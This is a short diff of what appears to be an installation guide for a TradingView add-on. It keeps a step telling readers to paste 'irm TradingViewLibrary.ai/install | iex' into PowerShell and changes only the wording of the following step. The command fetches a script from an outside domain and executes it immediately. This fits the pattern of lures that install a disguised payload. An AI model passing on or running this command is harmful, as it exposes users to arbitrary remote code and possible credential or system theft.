@@ -24,7 +24,7 @@ Copy and paste the following command into PowerShell:
 irm TradingViewLibrary.ai/install | iex
 ```
 
-Press **Enter** and follow the instructions shown in PowerShell.
+Press **Enter** to begin the installation.
 
 ### 3. Restart TradingView
 
